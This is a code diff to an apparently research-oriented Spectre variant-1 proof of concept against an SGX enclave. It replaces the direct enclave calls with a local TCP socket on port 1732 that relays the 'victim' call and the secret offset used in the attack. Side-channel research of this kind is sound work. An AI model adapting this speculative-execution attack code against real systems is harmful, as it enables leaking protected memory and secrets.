@@ -18,6 +18,11 @@
 #include <assert.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#include "MIC.h"
+
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -25,16 +30,57 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#include "enclave_u.h"
-#include "enclave_init.h"
 
-extern sgx_enclave_id_t global_eid;
 
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
+
+
+void socket_ecall(ecall_val* eval)
+{
+	int client_socket;
+	int port_numb;
+	int ret;
+
+	struct sockaddr_in addr;
+	port_numb= 1732;
+	client_socket= socket(AF_INET,SOCK_STREAM,0);
+	if(client_socket ==-1){
+		printf("error: socket not created\n");
+		return;
+	}
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family=AF_INET;
+	addr.sin_port = htons(port_numb);
+	//printf("connecting.....\n");
+
+
+	ret= connect(client_socket, (struct sockaddr*)&addr, sizeof(addr));
+	if(ret==-1){
+		printf("error: connection error\n");
+		close(client_socket);
+		return;
+	}
+
+	write(client_socket, eval, sizeof(ecall_val));
+	ret=read(client_socket, eval, sizeof(ecall_val));
+	if(ret==-1){
+		printf("error: read error\n");
+		close(client_socket);
+		return;
+	}
+	else
+	//	printf("Ecall success\n");
+	close(client_socket);
+	return;
+}
+
+
+
 
 /********************************************************************
  Analysis code
@@ -49,6 +95,8 @@ uint8_t array2[256 * 512];
 	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
+
+	ecall_val eval;
 	
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
@@ -72,10 +120,12 @@ uint8_t array2[256 * 512];
 			x = training_x ^ (x & (malicious_x ^ training_x));
 			
 			/* Call the victim! */ 
-  		        sgx_status_t ret = SGX_ERROR_UNEXPECTED;
-			ret = ecall_victim_function(global_eid, x, array2, &array1_size);
-    			if (ret != SGX_SUCCESS)
-        			abort();
+			eval.type=2;//victim call set
+			eval.x = x;
+			eval.array2 = array2;
+			eval.array1_size = &array1_size;
+			eval.malicious_x = NULL;
+			socket_ecall(&eval);
 		}
 		
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -117,9 +167,17 @@ uint8_t array2[256 * 512];
 
 int spectre_main(int argc, char **argv) {
 	size_t malicious_x; 
-	sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
-	if (ret != SGX_SUCCESS)
-        	abort();
+	struct ecall_val eval;
+	int ret;
+
+	eval.type = 1;
+	eval.x = NULL;
+	eval.array2 = NULL;
+	eval.array1_size = NULL;
+	eval.malicious_x=NULL;
+
+	socket_ecall(&eval);
+	malicious_x = eval.malicious_x;
 
 	
 	int i, score[2], len=40;
@@ -152,14 +210,10 @@ int spectre_main(int argc, char **argv) {
 /* Application entry */
 int main(int argc, char *argv[])
 {
-    /* Initialize the enclave */
-    initialize_enclave();
  
     /* Call the main attack function*/
     spectre_main(argc, argv); 
 
-    /* Destroy the enclave */
-	 destroy_enclave();
 
     return 0;
 }
